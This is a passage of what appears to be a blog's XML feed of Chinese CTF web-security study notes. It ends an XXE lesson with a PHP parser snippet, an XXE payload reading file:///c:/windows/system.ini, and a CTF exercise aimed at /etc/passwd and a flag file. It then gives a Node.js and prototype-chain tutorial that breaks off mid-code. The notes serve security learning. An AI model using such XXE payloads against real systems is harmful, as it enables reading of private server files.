class="token punctuation">;</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//This function takes a node of a DOM document and makes it into a SimpleXML node. This new object can then be used as a native SimpleXML element. </span>    <span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="utf-8"?><!DOCTYPE creds [<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini">]><creds>&goodies;</creds><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/11/best-xxe/6.png" alt="xml+php"></p><h4 id="1-1-3-3-练习题"><a href="#1-1-3-3-练习题" class="headerlink" title="1.1.3.3  练习题"></a><strong>1.1.3.3  练习题</strong></h4><p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><p>这道题要改文件类型为application/xml，flag路径为/home/ctf/flag.txt。（查看/etc/passwd只能看到路径，看不到文件名，哪想到是flag.txt）</p><pre class="line-numbers language-xml"><code class="language-xml">function XHR() {        var xhr;        try {xhr = new XMLHttpRequest();}        catch(e) {            var IEXHRVers =["Msxml3.XMLHTTP","Msxml2.XMLHTTP","Microsoft.XMLHTTP"];            for (var i=0,len=IEXHRVers.length;i&lt; len;i++) {                try {xhr = new ActiveXObject(IEXHRVers[i]);}                catch(e) {continue;}            }        }        return xhr;    }function send(){ evil_input = document.getElementById("evil-input").value; var xhr = XHR();     xhr.open("post","/api/v1.0/try",true);     xhr.onreadystatechange = function () {         if (xhr.readyState==4 &amp;&amp; xhr.status==201) {             data = JSON.parse(xhr.responseText);             tip_area = document.getElementById("tip-area");             tip_area.value = data.task.search+data.task.value;         }     };     xhr.setRequestHeader("Content-Type","application/json");     xhr.send('{"search":"'+evil_input+'","value":"own"}');}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>writeup：</strong></p><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80918975" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80918975</a></p><h3 id="1-1-4-XXE的漏洞危害"><a href="#1-1-4-XXE的漏洞危害" class="headerlink" title="1.1.4  XXE的漏洞危害"></a>1.1.4  XXE的漏洞危害</h3><h4 id="1-1-4-1-任意文件读取（无回显）"><a href="#1-1-4-1-任意文件读取（无回显）" class="headerlink" title="1.1.4.1  任意文件读取（无回显）"></a>1.1.4.1  任意文件读取（无回显）</h4><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p><strong>1、</strong> 一篇文章带你深入理解漏洞之 XXE 漏洞   <a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><strong>2、</strong>XML与xxe注入基础知识  <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p><p><strong>3、</strong>XML解析  <a href="https://blog.csdn.net/LiJiaxue_1224/article/details/91410571" target="_blank" rel="noopener">https://blog.csdn.net/LiJiaxue_1224/article/details/91410571</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_nodejs</title>
      <link href="/2020/05/10/best-nodejs/"/>
      <url>/2020/05/10/best-nodejs/</url>
      
        <content type="html"><![CDATA[<h1 id="1-nodejs"><a href="#1-nodejs" class="headerlink" title="1.  nodejs"></a>1.  nodejs</h1><p>Node.js 中文网  :  <a href="http://nodejs.cn/" target="_blank" rel="noopener">http://nodejs.cn/</a></p><p>官方网站：<a href="https://nodejs.org/" target="_blank" rel="noopener">https://nodejs.org/</a></p><p>一句话：Node.js手册是天！！！</p><p><img src="/2020/05/10/best-nodejs/4.png" alt="nodejs"></p><h2 id="1-1-nodejs基础"><a href="#1-1-nodejs基础" class="headerlink" title="1.1  nodejs基础"></a>1.1  nodejs基础</h2><p>简单的说 Node.js 就是运行在服务端的 JavaScript。Node.js是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node.js 使用了一个事件驱动、非阻塞式 I/O 的模型，使其轻量又高效。Node.js 的包管理器 npm，是全球最大的开源库生态系统。</p><h3 id="1-1-1-nodejs安装及环境配置"><a href="#1-1-1-nodejs安装及环境配置" class="headerlink" title="1.1.1  nodejs安装及环境配置"></a>1.1.1  nodejs安装及环境配置</h3><p><strong>参考资料：</strong></p><p><strong>1</strong>、Node.js安装及环境配置之Windows篇  <a href="https://www.jianshu.com/p/03a76b2e7e00" target="_blank" rel="noopener">https://www.jianshu.com/p/03a76b2e7e00</a></p><p><strong>2、</strong>npm 管理 NodeJS 包  <a href="https://linux.cn/article-9614-1.html" target="_blank" rel="noopener">https://linux.cn/article-9614-1.html</a></p><p>参考资料的讲解已经非常详尽了。</p><p><img src="/2020/05/10/best-nodejs/5.png" alt="npm install"></p><h3 id="1-1-2-command"><a href="#1-1-2-command" class="headerlink" title="1.1.2  command"></a>1.1.2  command</h3><p><strong>let</strong></p><p>在新的js规范ES6中，新增了<code>let</code>命令，用来声明变量。用法类似于var，但不同的是所声明的变量，只在<code>let</code> 命令所在的代码块内有效。 </p><h3 id="1-1-3-jwt"><a href="#1-1-3-jwt" class="headerlink" title="1.1.3  jwt"></a>1.1.3  jwt</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//javascript的crypto模块</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//jsonwebtoken 库</span><span class="token comment" spellcheck="true">//normal-encode-process</span><span class="token keyword">const</span> secret <span class="token operator">=</span> <span class="token string">"NuAa"</span><span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span>username<span class="token punctuation">}</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">{</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// eyJhbGciOiJIUzI1NiJ9.YWRtaW4.IhPaXo5KXx1Nh7mcvVPq5gycWLe6-3pLaZUa17vKKwY</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-2-nodejs进阶"><a href="#1-2-nodejs进阶" class="headerlink" title="1.2  nodejs进阶"></a>1.2  nodejs进阶</h2><h3 id="1-2-1-node-modules"><a href="#1-2-1-node-modules" class="headerlink" title="1.2.1  node_modules"></a>1.2.1  node_modules</h3><h4 id="1-2-1-1-child-process"><a href="#1-2-1-1-child-process" class="headerlink" title="1.2.1.1  child_process"></a>1.2.1.1  child_process</h4><p>NodeJs是一个单进程的语言，不能像Java那样可以创建多线程来并发执行。当然在大部分情况下，NodeJs是不需要并发执行的，因为它是事件驱动性永不阻塞。但单进程也有个问题就是不能充分利用CPU的多核机制，根据前人的经验，可以通过创建多个进程来充分利用CPU多核，并且Node通过了child_process模块来创建完成多进程的操作。</p><p>child_process模块给予node任意创建子进程的能力，node官方文档对于child_proces模块给出了四种方法，映射到操作系统其实都是创建子进程。</p><p><strong>第一种：</strong></p><p><code>child_process.exec()</code>: 衍生一个 shell 并在该 shell 中运行命令，当完成时则将 stdout 和 stderr 传给回调函数。</p><h3 id="1-2-2-框架"><a href="#1-2-2-框架" class="headerlink" title="1.2.2  框架"></a>1.2.2  框架</h3><h4 id="1-2-2-1-express"><a href="#1-2-2-1-express" class="headerlink" title="1.2.2.1  express"></a>1.2.2.1  express</h4><p><strong>参考资料：</strong></p><p><strong>1、NodeJS express</strong>（tql）  <a href="https://www.jianshu.com/p/5cd306db1c0a" target="_blank" rel="noopener">https://www.jianshu.com/p/5cd306db1c0a</a></p><h5 id="express1-快速搭建后台服务"><a href="#express1-快速搭建后台服务" class="headerlink" title="express1 快速搭建后台服务"></a>express1 快速搭建后台服务</h5><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//1、引入express模块</span><span class="token keyword">const</span> server <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//2、调用express方法实例化对象</span>server<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//3、设置路由，响应不同的url地址请求</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'express 搭建后台服务'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//4、监听端口</span><span class="token comment" spellcheck="true">//vocode输出栏下右键，Stop Code Run</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/10/best-nodejs/6.png" alt="后台"></p><h5 id="express2-路由"><a href="#express2-路由" class="headerlink" title="express2 路由"></a>express2 路由</h5><p>语法：app.methods（path,callback）</p><ul><li>app 是 express 实例对象</li><li>methods 是请求方法 get | post | put | update | delete |…</li><li>path 就是路径（url定值的 pathname ），必须以’/‘开头</li><li>callback 回调函数，路由的处理函数 <ul><li>req</li><li>res （这里的 req res 就是原生nodejs中的 req res。但比原生中要多一些属性方法，是express加上去的）</li><li>next 是一个方法，调用这个方法会让路由继续匹配下一个能匹配上的</li></ul></li></ul><h5 id="express3-中间件"><a href="#express3-中间件" class="headerlink" title="express3 中间件"></a>express3 中间件</h5><p>中间件其实是一个携带req、res、next这三个参数的函数，在请求与响应之间做一些中间处理的代码。</p><h5 id="express4-跨域"><a href="#express4-跨域" class="headerlink" title="express4 跨域"></a>express4 跨域</h5><h1 id="2-原型链"><a href="#2-原型链" class="headerlink" title="2.  原型链"></a>2.  原型链</h1><p>2020年网鼎杯第一场青龙组就出了一道web题，是考察javascript原型链泄露的，基于此对这一块进行深入了解和学习下。</p><h2 id="2-1-javascript——原型与原型链"><a href="#2-1-javascript——原型与原型链" class="headerlink" title="2.1  javascript——原型与原型链"></a>2.1  javascript——原型与原型链</h2><h3 id="2-1-1-原型链基础"><a href="#2-1-1-原型链基础" class="headerlink" title="2.1.1  原型链基础"></a>2.1.1  原型链基础</h3><h4 id="2-1-1-1-prototype-函数字面量"><a href="#2-1-1-1-prototype-函数字面量" class="headerlink" title="2.1.1.1  prototype (函数字面量)"></a>2.1.1.1  prototype <code>(函数字面量)</code></h4><p>在JavaScript中，每个函数（也只有函数才有）都有一个prototype属性，这个属性指向函数的原型对象。 </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age       <span class="token punctuation">}</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'pperk'</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person1<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//pperk</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person2<span class="token punctuation">.</span>name<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//pperk</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/10/best-nodejs/8.png" alt="原型对象"></p><p>上述例子中，函数的prototype指向了一个对象，而这个对象正是调用构造函数时创建的实例的原型，也就是person1和person2的原型。</p><p>原型的概念：每一个javascript对象(除null外)创建的时候，就会与之关联另一个对象，这个对象就是我们所说的原型，每一个对象都会从原型中“继承”属性。</p><p>让我们用一张图表示构造函数和实例原型之间的关系： </p><p><img src="/2020/05/10/best-nodejs/7.png" alt="关系图1"></p><h4 id="2-1-1-2-proto-对象字面量"><a href="#2-1-1-2-proto-对象字面量" class="headerlink" title="2.1.1.2  __proto__ (对象字面量)"></a>2.1.1.2  <code>__proto__ (对象字面量)</code></h4><p>这是每个对象(除null外)都会有的属性，叫做<code>__proto__</code>，这个属性会指向该对象的原型。 </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Person<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而关系图： </p><p><img src="/2020/05/10/best-nodejs/9.png" alt="关系图2"></p><p>补充说明：</p><p>绝大部分浏览器都支持这个非标准的方法访问原型，然而它并不存在于 Person.prototype 中，实际上，它是来自于  Object.prototype ，与其说是一个属性，不如说是一个 getter/setter，当使用 <code>obj.__proto__</code>  时，可以理解成返回了 Object.getPrototypeOf(obj)。</p><h4 id="2-1-1-3-constructor"><a href="#2-1-1-3-constructor" class="headerlink" title="2.1.1.3  constructor"></a>2.1.1.3  constructor</h4><p>每个原型都有一个constructor属性，指向该关联的构造函数。 </p><p>函数对象和原型对象通过prototype和constructor属性进行相互关联。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Person<span class="token operator">===</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 所以再更新下关系图： </p><p><img src="/2020/05/10/best-nodejs/10.png" alt="关系图3"></p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Person<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Person<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span><span class="token comment" spellcheck="true">// 顺便学习一个ES5的方法,可以获得对象的原型</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span> <span class="token operator">===</span> Person<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>补充说明： </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Person<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当获取 person.constructor 时，其实 person 中并没有 constructor 属性,当不能读取到constructor 属性时，会从 person 的原型也就是 Person.prototype 中读取，正好原型中有该属性，所以： </p><pre class="line-numbers language-javascript"><code class="language-javascript">person<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-1-1-4-实例与原型"><a href="#2-1-1-4-实例与原型" class="headerlink" title="2.1.1.4  实例与原型"></a>2.1.1.4  实例与原型</h4><p>当读取实例的属性时，如果找不到，就会查找与对象关联的原型中的属性，如果还查不到，就去找原型的原型，一直找到最顶层为止。 </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Kevin'</span><span class="token punctuation">;</span><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>person<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Daisy'</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Daisy</span><span class="token keyword">delete</span> person<span class="token punctuation">.</span>name<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Kevin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们给实例对象 person 添加了 name 属性，当我们打印 person.name 的时候，结果自然为 Daisy。</p><p>但是当我们删除了 person 的 name 属性时，读取 person.name，从 person 对象中找不到 name 属性就会从  person 的原型也就是 <code>person.__proto__</code> ，也就是 Person.prototype中查找，幸运的是我们找到了 name  属性，结果为 Kevin。</p><p>但是万一还没有找到呢？原型的原型又是什么呢？</p><h4 id="2-1-1-5-原型的原型"><a href="#2-1-1-5-原型的原型" class="headerlink" title="2.1.1.5  原型的原型"></a>2.1.1.5  原型的原型</h4><p>在前面，我们已经讲了原型也是一个对象，既然是对象，我们就可以用最原始的方式创建它，那就是： </p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Kevin'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Kevin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其实原型对象就是通过 Object 构造函数生成的，结合之前所讲，实例的 <code>__proto__</code>指向构造函数的 prototype ，所以我们再更新下关系图： </p><p><img src="/2020/05/10/best-nodejs/11.png" alt="关系图4"></p><h4 id="2-1-1-6-原型链理论"><a href="#2-1-1-6-原型链理论" class="headerlink" title="2.1.1.6  原型链理论"></a>2.1.1.6  原型链理论</h4><p>简单的回顾一下构造函数、原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。那么假如我们让原型对象等于另一个类型的实例，结果会怎样？显然，此时的原型对象将包含一个指向另一个原型的指针，相应地，另一个原型中也包含着一个指向另一个构造函数的指针。假如另一个原型又是另一个类型的实例，那么上述关系依然成立。如此层层递进，就构成了实例与原型的链条。这就是所谓的原型链的基本概念。——摘自《javascript高级程序设计》 </p><p>其实简单来说，就是上述四-五的过程。</p><p>继上述五中所说，那 Object.prototype 的原型呢？</p><pre><code>console.log(Object.prototype.__proto__ === null) // true</code></pre><p>null 表示“没有对象”，即该处不应该有值。 </p><p>所以 <code>Object.prototype.__proto__</code> 的值为 null 跟 Object.prototype 没有原型，其实表达了一个意思。</p><p>所以查找属性的时候查到 Object.prototype 就可以停止查找了。</p><p>最后一张关系图也可以更新为：</p><p><img src="/2020/05/10/best-nodejs/12.png" alt="关系图5"></p><p> 图中由相互关联的原型组成的链状结构就是原型链，也就是蓝色的这条线。 </p><h3 id="2-1-2-原型链进阶"><a href="#2-1-2-原型链进阶" class="headerlink" title="2.1.2  原型链进阶"></a>2.1.2  原型链进阶</h3><p>原型链依靠<code>__proto__</code>进行连接。</p><p>原型对象等于其他对象的实例来构造原型链。</p><p><img src="/2020/05/10/best-nodejs/13.png" alt="只有大佬才懂的图"></p><h4 id="2-1-2-1-Function-prototype"><a href="#2-1-2-1-Function-prototype" class="headerlink" title="2.1.2.1  Function.prototype"></a>2.1.2.1  Function.prototype</h4><p><strong>参考资料：</strong></p><p><strong>1、</strong>Function.prototype  <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/prototype" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/prototype</a></p><p>Function.prototype 属性存储了 Function 的原型对象。</p><p>所有构造函数的<code>__proto__</code>都指向Function.prototype，它是一个空函数(Empty function) </p><p><img src="/2020/05/10/best-nodejs/14.png" alt="Function.prototype"></p><h4 id="2-1-2-2-Object-proto"><a href="#2-1-2-2-Object-proto" class="headerlink" title="2.1.2.2  Object.__proto__"></a>2.1.2.2  <code>Object.__proto__</code></h4><p>根据前面的内容可知，对象字面量的<code>__proto__</code>直接指向大Boss–&gt;Object ，那我们来创建一个实例原型b，b的<code>__proto__</code>指向Object。从下图可以看出，<code>Object.__proto__</code>为null，null也意味着我们可以对其进行赋值。</p><p><img src="/2020/05/10/best-nodejs/15.png" alt="Object"></p><h4 id="2-1-2-3-var"><a href="#2-1-2-3-var" class="headerlink" title="2.1.2.3   var"></a>2.1.2.3   var</h4><p>new操作符，在js中用于创建一个新的对象，在实际实现<br><code>(var p=new ObjectName(param1,parem2…);)</code>的过程中，主要经历了以下三个步骤：</p><ul><li>var o={};</li><li><code>o.__proto__</code>=ObjectName.prototype;</li><li><code>ObjectName.call(o,parma1,param2)</code>;</li></ul><h4 id="2-1-2-4-原型链构造"><a href="#2-1-2-4-原型链构造" class="headerlink" title="2.1.2.4  原型链构造"></a>2.1.2.4  原型链构造</h4><p>本章节对应2.1.1.6  原型链理论，构造详情如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Mammal</span><span class="token punctuation">(</span>generic<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>generic<span class="token operator">=</span>generic<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>sex<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token operator">=</span>sex<span class="token punctuation">;</span><span class="token punctuation">}</span>Person<span class="token punctuation">.</span>prototype<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Mammal</span><span class="token punctuation">(</span><span class="token string">"Mankind"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> zhangdan<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"zhangdan"</span><span class="token punctuation">,</span><span class="token string">"female"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//Person函数的原型对象等于另一个类型（Mammal）的实例</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token operator">===</span>Mammal<span class="token punctuation">.</span>prototype<span class="token boolean">true</span>Person函数原型对象的__proto__属性与Mammal函数的原型对象相等。<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__Person<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token operator">===</span>Mammal<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token boolean">true</span>Mammal<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token keyword">null</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span 